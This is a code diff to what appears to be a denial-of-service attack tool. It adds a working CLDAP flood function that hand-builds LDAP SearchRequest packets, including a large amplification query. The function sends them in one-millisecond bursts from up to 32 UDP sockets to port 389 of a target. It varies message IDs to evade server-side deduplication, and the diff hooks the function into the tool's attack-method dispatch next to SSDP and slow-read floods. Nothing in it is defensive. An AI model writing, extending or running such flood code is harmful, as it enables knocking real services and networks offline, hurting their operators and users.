@@ -901,6 +901,97 @@ async function runSSDPFlood(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  CLDAP FLOOD — Connectionless LDAP (UDP/389) SearchRequest flood
+//  Sends BER-encoded LDAP SearchRequest packets to port 389.
+//  Each 39-62-byte request forces the LDAP service to parse and respond.
+//  Against Windows AD/OpenLDAP: exhausts LDAP worker thread pool.
+//  Amplification variant requests supportedCapabilities (~1.5KB response).
+// ─────────────────────────────────────────────────────────────────────────
+async function runCLDAPFlood(
+  resolvedHost: string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  // Packet A: rootDSE minimal query — 39 bytes, returns all attributes (~1.5KB)
+  const PKT_BASE = Buffer.from([
+    0x30, 0x25,                    // SEQUENCE, length 37
+    0x02, 0x01, 0x01,              // INTEGER 1 (messageID)
+    0x63, 0x20,                    // [APPLICATION 3] SearchRequest, length 32
+    0x04, 0x00,                    // baseObject OCTET STRING "" (root DSE)
+    0x0a, 0x01, 0x00,              // scope ENUMERATED 0 (baseObject)
+    0x0a, 0x01, 0x00,              // derefAliases ENUMERATED 0 (neverDeref)
+    0x02, 0x01, 0x00,              // sizeLimit INTEGER 0 (unlimited)
+    0x02, 0x01, 0x00,              // timeLimit INTEGER 0 (unlimited)
+    0x01, 0x01, 0x00,              // typesOnly BOOLEAN false
+    0x87, 0x0b,                    // filter [7] present, length 11
+    0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73, // "objectclass"
+    0x30, 0x00,                    // attributes SEQUENCE {} (return all)
+  ]);
+
+  // Packet B: requests supportedCapabilities attribute — triggers ~2KB response from Windows AD
+  const PKT_CAPS = Buffer.from([
+    0x30, 0x3c,                    // SEQUENCE, length 60 (total 62 bytes)
+    0x02, 0x01, 0x02,              // INTEGER 2 (messageID)
+    0x63, 0x37,                    // [APPLICATION 3] SearchRequest, length 55
+    0x04, 0x00,                    // baseObject ""
+    0x0a, 0x01, 0x00,              // scope baseObject
+    0x0a, 0x01, 0x00,              // derefAliases neverDeref
+    0x02, 0x01, 0x00,              // sizeLimit 0
+    0x02, 0x01, 0x00,              // timeLimit 0
+    0x01, 0x01, 0x00,              // typesOnly false
+    0x87, 0x0b,                    // present filter, length 11
+    0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73, // "objectclass"
+    0x30, 0x17,                    // attributes SEQUENCE, length 23
+    0x04, 0x15,                    // OCTET STRING, length 21
+    // "supportedCapabilities" (21 bytes)
+    0x73,0x75,0x70,0x70,0x6f,0x72,0x74,0x65,0x64,0x43,
+    0x61,0x70,0x61,0x62,0x69,0x6c,0x69,0x74,0x69,0x65,0x73,
+  ]);
+
+  const PACKETS = [PKT_BASE, PKT_CAPS];
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 32) : Math.min(threads, 8);
+  const BURST = getDynamicBurst(300);
+  const TICK_MS = 1;
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const sockDones: Promise<void>[] = [];
+  for (let _s = 0; _s < NUM_SOCKS; _s++) {
+    const sockDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      let msgIdx = 0;
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          for (let i = 0; i < BURST; i++) {
+            const base = PACKETS[(msgIdx) % PACKETS.length];
+            // Clone and vary messageID to avoid server-side dedup
+            const pkt = Buffer.from(base);
+            pkt[4] = (msgIdx & 0xff);
+            msgIdx++;
+            sock.send(pkt, 0, pkt.length, 389, resolvedHost, () => {
+              localPkts++; localBytes += pkt.length;
+            });
+          }
+        }, TICK_MS);
+      });
+    });
+    sockDones.push(sockDone);
+  }
+  await Promise.all(sockDones);
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  PROXY REQUEST — routes HTTP through a proxy using native node:http
 //  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
 // ─────────────────────────────────────────────────────────────────────────
@@ -5837,6 +5928,10 @@ async function runWorker() {
   } else if (cfg.method === "ssdp-amp") {
     // SSDP Flood — real M-SEARCH packets to port 1900 (UPnP/SSDP stack exhaustion)
     await runSSDPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "cldap-amp") {
+    // CLDAP Flood — BER-encoded LDAP SearchRequest packets to UDP/389
+    await runCLDAPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "slow-read") {
     // Slow Read — pause TCP receive to fill server's send buffer → thread blocked
